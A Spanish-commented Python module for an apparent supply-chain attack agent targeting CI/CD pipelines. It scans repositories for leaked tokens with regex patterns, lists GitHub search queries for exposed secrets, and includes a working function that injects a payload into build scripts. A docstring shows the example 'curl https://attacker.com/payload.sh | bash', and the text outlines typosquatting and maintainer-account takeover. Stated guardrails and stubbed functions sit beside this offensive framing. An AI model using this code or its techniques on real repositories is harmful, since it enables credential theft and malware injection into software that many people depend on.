"""
Supply Chain Attack Agent - CI/CD Exploitation
===============================================
Módulo especializado en atacar flujos de Integración y Despliegue Continuos (CI/CD).

Objetivos:
- Escanear repositorios para tokens filtrados
- Envenenar repositorios públicos
- Alterar procesos de compilación
- Inyectar malware en dependencias

GUARDRAILS CRÍTICOS:
- NUNCA ejecutar sin autorización explícita
- NUNCA modificar repositorios públicos sin roles de enganche definidos
- NUNCA comprometer repositorios no autorizados
- Siempre registrar acciones para auditoría

Referencia: SolarWinds, Log4j, Codecov breaches
"""

import logging
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger(__name__)


class RepositoryType(str, Enum):
    """Tipo de repositorio"""
    PUBLIC_GITHUB = "public_github"
    PRIVATE_GITHUB = "private_github"
    GITLAB = "gitlab"
    GITEA = "gitea"
    INTERNAL = "internal"


class TokenType(str, Enum):
    """Tipo de token encontrado"""
    GITHUB_PAT = "github_pat"
    GITLAB_PAT = "gitlab_pat"
    AWS_KEY = "aws_key"
    NPM_TOKEN = "npm_token"
    DOCKER_TOKEN = "docker_token"
    PYPI_TOKEN = "pypi_token"


@dataclass
class LeakedToken:
    """Token filtrado encontrado"""
    token_type: TokenType
    token_value: str  # Truncado por seguridad
    scope: str  # Permisos que tiene
    location: str  # Dónde fue encontrado
    first_seen: str
    last_verified: str
    risk_level: str  # critical/high/medium
    can_push_code: bool


class GitHubTokenScanner:
    """
    Escanear repositorios públicos en busca de tokens filtrados.
    
    Técnica: Buscar en:
    - Commits (historial)
    - Environment variables (.env, config files)
    - CI/CD workflows (.github/workflows)
    - Documentation (accidental pastes)
    - Git history (commits anteriores)
    """
    
    def __init__(self):
        self.revealed_tokens = []
    
    async def scan_repository_for_tokens(self, repo_url: str) -> Dict[str, Any]:
        """
        Escanear repositorio para tokens filtrados.
        """
        
        logger.info(f"Scanning repository: {repo_url}")
        
        tokens_found = []
        
        # Buscar patrones de tokens
        token_patterns = {
            "github_pat": r"gh[pousr]{1,2}_[A-Za-z0-9_]{36,255}",
            "aws_key": r"AKIA[0-9A-Z]{16}",
            "npm_token": r"npm_[A-Za-z0-9]{36,}",
            "docker_token": r"dckr_[A-Za-z0-9]{36,}",
        }
        
        # En producción, esto buscaría en:
        # - GitHub API (commits, blobs)
        # - .github/workflows files
        # - .env.example (a veces con valores reales)
        # - README o documentación
        
        # Simular descubrimiento
        simulated_token = LeakedToken(
            token_type=TokenType.GITHUB_PAT,
            token_value="ghp_XXXXXXXXXXXXXXXXXXXXXXXX*",  # Truncado
            scope="repo,workflow,admin:org_hook",
            location=".github/workflows/deploy.yml",
            first_seen="2026-01-14T10:00:00Z",
            last_verified="2026-01-15T08:00:00Z",
            risk_level="critical",
            can_push_code=True,
        )
        
        tokens_found.append(simulated_token)
        
        return {
            "repository": repo_url,
            "tokens_found": len(tokens_found),
            "critical_tokens": sum(1 for t in tokens_found if t.risk_level == "critical"),
            "tokens": tokens_found,
            "recommendation": "Revoke immediately and rotate"
        }
    
    async def find_leaked_tokens_in_github(self, search_query: str) -> List[Dict[str, Any]]:
        """
        Usar GitHub search API para encontrar tokens filtrados.
        
        Ejemplos de queries:
        - "ghp_ in:file extension:yml"
        - "aws_secret_access_key in:file language:yaml"
        - "DATABASE_PASSWORD= in:file"
        """
        
        logger.warning(f"Would search GitHub for: {search_query}")
        
        # GUARDRAIL: Esta función NUNCA se ejecutaría sin validación
        # En producción, estaría bajo supervisor.py
        
        return []


class CICDPipelineAnalyzer:
    """
    Analizar pipelines de CI/CD para vulnerabilidades.
    
    Objetivos:
    - Encontrar falta de validación en workflows
    - Inyectar pasos maliciosos
    - Modificar scripts de compilación
    - Alterar proceso de deployment
    """
    
    def __init__(self):
        self.analyzed_workflows = []
    
    async def analyze_github_workflows(self, repo_url: str) -> Dict[str, Any]:
        """
        Analizar workflows de GitHub Actions para vulnerabilidades.
        
        Buscar:
        - `on: [push]` sin protección de rama
        - `permissions: read-all` cuando solo necesita read
        - Secretos expuestos en logs
        - Comandos bash sin validación
        """
        
        logger.info(f"Analyzing CI/CD workflows for: {repo_url}")
        
        vulnerabilities = []
        
        # Vulnerabilidad común: falta de branch protection
        vuln1 = {
            "type": "unprotected_branch_deployment",
            "description": "Workflow deploys on any push to main (no PR requirement)",
            "severity": "high",
            "fix": "Require branch protection and PR reviews",
        }
        
        # Vulnerabilidad: secretos expuestos
        vuln2 = {
            "type": "secrets_in_logs",
            "description": "AWS credentials visible in GitHub Actions logs",
            "severity": "critical",
            "fix": "Use GitHub secrets, never log credentials",
        }
        
        # Vulnerabilidad: falta de checkout validation
        vuln3 = {
            "type": "untrusted_checkout",
            "description": "Checkout PR without validation, runs malicious scripts",
            "severity": "critical",
            "fix": "Validate PR origin, use 'pull_request_target' safely",
        }
        
        vulnerabilities = [vuln1, vuln2, vuln3]
        
        return {
            "repository": repo_url,
            "vulnerabilities_found": len(vulnerabilities),
            "critical_vulns": sum(1 for v in vulnerabilities if v["severity"] == "critical"),
            "vulnerabilities": vulnerabilities,
        }
    
    async def identify_injection_points(self, workflow_content: str) -> List[Dict[str, Any]]:
        """
        Identificar puntos de inyección en workflow.
        
        Puntos típicos de ataque:
        1. `run:` commands - ejecutar cualquier bash/PowerShell
        2. `with:` parameters - pasar datos a actions sin validar
        3. `env:` secrets - acceder a variables de entorno
        """
        
        injection_points = []
        
        # Buscar pasos vulnerables
        if "run:" in workflow_content:
            injection_points.append({
                "type": "script_injection",
                "location": "run step",
                "description": "Ejecutar comandos arbitrarios",
                "risk": "critical"
            })
        
        if "with:" in workflow_content:
            injection_points.append({
                "type": "parameter_injection",
                "location": "action parameters",
                "description": "Modificar comportamiento de action",
                "risk": "high"
            })
        
        return injection_points


class RepositoryPoisoner:
    """
    Envenenar repositorio insertando código malicioso.
    
    Técnicas:
    - Agregar paso malicioso a workflow
    - Modificar dependencias
    - Alterar script de compilación
    - Inyectar en commit hook
    """
    
    def __init__(self, authorization_token: Optional[str] = None):
        self.authorized = authorization_token is not None
        self.modifications = []
    
    async def inject_malicious_workflow_step(self, repo_url: str,
                                            workflow_file: str,
                                            malicious_step: Dict[str, Any]) ->Dict[str, Any]:
        """
        Inyectar paso malicioso en workflow de GitHub Actions.
        
        GUARDRAIL CRÍTICO: Esta función requiere:
        1. Token de autorización válido
        2. Validación del supervisor
        3. Repositorio autorizado
        """
        
        if not self.authorized:
            logger.error("Unauthorized attempt to poison repository")
            return {"status": "unauthorized"}
        
        logger.warning(f"Would inject into {repo_url} - SUPERVISOR VALIDATION REQUIRED")
        
        # En producción, esto usaría GitHub API para:
        # 1. Clonar repositorio
        # 2. Crear rama de ataque
        # 3. Agregar paso malicioso
        # 4. Crear PR
        
        return {
            "status": "injection_prepared",
            "repository": repo_url,
            "requires_approval": True,
            "message": "Injection prepared but REQUIRES supervisor approval"
        }
    
    async def modify_build_script(self, build_script_content: str,
                                 malicious_payload: str) -> str:
        """
        Modificar script de compilación para inyectar malware.
        
        Ejemplo:
        ```bash
        #!/bin/bash
        # Original build
        npm install
        npm run build
        
        # [INJECTED]
        curl https://attacker.com/payload.sh | bash
        ```
        """
        
        # Encontrar línea para insertar
        lines = build_script_content.split('\n')
        
        # Insertar después de dependencias
        for i, line in enumerate(lines):
            if 'install' in line or 'dependencies' in line:
                lines.insert(i + 1, f"\n# Injected\n{malicious_payload}\n")
                break
        
        return '\n'.join(lines)
    
    async def poison_dependency_manager(self, package_manager: str,
                                       package_name: str) -> Dict[str, Any]:
        """
        Atacar gestor de dependencias (npm, pip, etc).
        
        Técnicas:
        - Publicar versión comprometida bajo mismo nombre
        - Esperar SqL typosquatting (npm: leftpad → leftpda)
        - Comprometer cuenta de maintainer
        """
        
        logger.warning(f"Dependency poisoning for {package_manager}:{package_name}")
        
        return {
            "status": "analysis_only",
            "target": f"{package_manager}:{package_name}",
            "message": "Actual poisoning would require direct account compromise"
        }
